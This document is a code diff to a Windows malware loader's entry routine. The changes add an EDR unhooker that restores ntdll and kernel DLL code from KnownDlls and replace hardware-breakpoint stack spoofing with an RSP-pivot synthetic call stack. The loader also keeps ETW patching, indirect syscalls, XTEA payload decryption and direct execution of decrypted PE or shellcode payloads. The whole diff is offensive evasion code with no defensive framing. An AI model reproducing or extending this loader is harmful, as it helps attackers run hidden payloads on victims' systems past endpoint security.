@@ -7,10 +7,11 @@
 #include "..\Engine\RunPE.h"
 #include "..\Engine\OpsecFlags.h"
 #include "Syscalls.h"
-#include "VehSpoof.h"
+#include "StackSpoof.h"
 #include "ModuleStomping.h"
 #include "Evasion.h"
 #include "..\Engine\Xtea.h"
+#include "Unhooker.h"
 
 // Force C++ compiler to treat this as C linkable
 extern "C" {
@@ -85,20 +86,41 @@ extern "C" int EntryPoint() {
     if (!Syscalls_Init())  pExitProcess(29);
     if (!InitNtApi())      pExitProcess(30);
 
-    /* Step 3: Optional call-stack spoofing (HWBP/VEH).
-     * Skip when OPSEC_FLAG_NO_CALLSTACK is set — useful when debugging payloads
-     * or in environments where hardware breakpoints cause instability. */
+    /* Step 2.5: Optional EDR userland unhooker.
+    * Restores original .text bytes in ntdll/kernel32/kernelbase from
+    * \KnownDlls\ clean copies, overwriting EDR inline hooks.
+    * Runs after InitNtApi so Sys_Nt* wrappers (HellsHall) are available.
+    * Runs before StackSpoof so subsequent Win32 calls hit clean code. */
+    if (opsecFlags & EVASION_FLAG_UNHOOK) {
+        Unhook_RestoreAll();
+    }
+
+    /* Step 3: Optional call-stack spoofing (SilentMoonwalk RSP pivot).
+     * StackSpoof_Init locates two ntdll gadgets (`add rsp, imm; ret` and
+     * `jmp rbx`) and builds a synthetic stack so that — every time
+     * HellsHallSyscall fires — RSP is pivoted onto a fake frame anchored at
+     * RtlUserThreadStart, hiding the loader's real return chain from EDR
+     * stack walkers.  Skip when OPSEC_FLAG_NO_CALLSTACK is set. */
     if (!(opsecFlags & OPSEC_FLAG_NO_CALLSTACK)) {
-        if (!VehSpoof_Init(HellsHallSyscall)) pExitProcess(31);
+        if (!StackSpoof_Init()) {
+            /* 41 = ntdll base, 42 = AddRsp gadget, 43 = JmpRbx gadget,
+             * 44 = RtlUserThreadStart export */
+            pExitProcess(40 + g_SpoofInitFailStep);
+        }
     }
 
     /* Step 4: Optional ETW patch.
      * Completes the evasion triad:
      *   API hooks     → HellsHall (indirect syscall, no ntdll hook hit)
-     *   Call stack    → VEH/HWBP spoof (EDR sees legitimate ntdll frame)
+     *   Call stack    → Moonwalk RSP pivot (synthetic stack rooted at RtlUserThreadStart)
      *   ETW events    → Opsec_PatchEtw (EtwEventWrite → xor eax,eax / ret) */
     if (!(opsecFlags & OPSEC_FLAG_NO_ETW)) {
-        if (!Opsec_PatchEtw()) pExitProcess(32);
+        if (!Opsec_PatchEtw()) {
+            /* 61 = no ntdll, 62 = no EtwEventWrite export,
+             * 63 = Syscalls_GetParamsByHash failed for NtProtectVirtualMemory,
+             * 64 = NtProtectVirtualMemory returned non-success */
+            pExitProcess(60 + g_EtwFailStep);
+        }
     }
 
     /* Step 5: XTEA outer decryption.
@@ -262,15 +284,16 @@ extern "C" int EntryPoint() {
     /* Step 9: Run payload — two paths depending on flags.
      *
      * PE path (default):
-     *   Pass VehSpoof_Cleanup as pre-execute callback.  RunPE calls it after
-     *   all syscalls complete but before handing over to the payload, ensuring
-     *   hardware breakpoints and the VEH handler are removed from this thread.
+     *   Pass StackSpoof_Cleanup as pre-execute callback.  RunPE calls it after
+     *   all syscalls complete but before handing over to the payload, so the
+     *   pivot is disabled before the payload starts running its own threads
+     *   (which must see real return addresses).
      *
      * Shellcode path (PAYLOAD_FLAG_IS_SHELLCODE):
      *   No PE mapping needed.  Flip the decompressed buffer RW→RX via indirect
-     *   syscall, call VehSpoof_Cleanup manually (same OPSEC invariant as PE path),
-     *   then jump directly into the shellcode.  The RX flip reuses the same
-     *   NtProtect SSN + trampoline already resolved above. */
+     *   syscall, call StackSpoof_Cleanup manually (same OPSEC invariant as PE
+     *   path), then jump directly into the shellcode.  The RX flip reuses the
+     *   same NtProtect SSN + trampoline already resolved above. */
     if (opsecFlags & PAYLOAD_FLAG_IS_SHELLCODE) {
         /* Flip decompressed buffer: RW → RX */
         SIZE_T scSize  = (SIZE_T)origDecompSize;
@@ -283,8 +306,8 @@ extern "C" int EntryPoint() {
             pExitProcess(36);
         }
 
-        /* Remove HWBP + VEH handler before handing over — same invariant as RunPE's PreExecuteCb */
-        if (!(opsecFlags & OPSEC_FLAG_NO_CALLSTACK)) VehSpoof_Cleanup();
+        /* Disable RSP pivot before handing over — same invariant as RunPE's PreExecuteCb */
+        if (!(opsecFlags & OPSEC_FLAG_NO_CALLSTACK)) StackSpoof_Cleanup();
 
         void (*pShellcode)(void) = (void (*)(void))pDecompressedPE;
         pShellcode();
@@ -293,7 +316,7 @@ extern "C" int EntryPoint() {
         custom_memset(pDecompressedPE, 0, origDecompSize);
         pVirtualFree(pDecompressedPE, 0, MEM_RELEASE);
     } else {
-        void (*pPreExec)(void) = (opsecFlags & OPSEC_FLAG_NO_CALLSTACK) ? NULL : VehSpoof_Cleanup;
+        void (*pPreExec)(void) = (opsecFlags & OPSEC_FLAG_NO_CALLSTACK) ? NULL : StackSpoof_Cleanup;
         DWORD runPeRes = RunPE(pDecompressedPE, exportHash, exportSeed, pExportArg, pPreExec);
 
         custom_memset(pDecompressedPE, 0, origDecompSize);
